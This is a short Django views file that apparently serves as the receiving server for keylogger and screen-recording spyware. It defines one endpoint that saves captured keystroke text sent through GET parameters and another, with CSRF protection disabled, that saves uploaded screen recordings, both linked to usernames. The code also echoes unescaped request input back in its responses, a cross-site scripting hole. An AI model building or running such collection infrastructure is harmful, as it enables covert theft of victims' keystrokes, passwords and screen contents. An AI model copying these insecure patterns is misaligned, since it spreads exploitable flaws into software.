from django.shortcuts import render
from django.http import HttpResponse
from .models import KeyLog, ScreenRecord
from django.contrib.auth.models import User
from django.views.decorators.csrf import csrf_exempt

def getkeylogs(request):
    user = User.objects.filter(username=request.GET.__getitem__('user')).first()
    if user is None:
        k = KeyLog(content=request.GET.__getitem__('content'))
    else:
        k = KeyLog(content=request.GET.__getitem__('content'), user=user)
    k.save()
    return HttpResponse('success ' + request.GET.__getitem__('user') + ', ' + request.GET.__getitem__('content'))


@csrf_exempt
def getscreenrecords(request):
    user = User.objects.filter(username=request.POST.get('user')).first()
    if user is None:
        k = ScreenRecord(record=request.FILES.get('record'))
    else:
        k = ScreenRecord(record=request.FILES.get('record'), user=user)
    k.save()
    return HttpResponse('success ' + request.GET.__getitem__('user'))
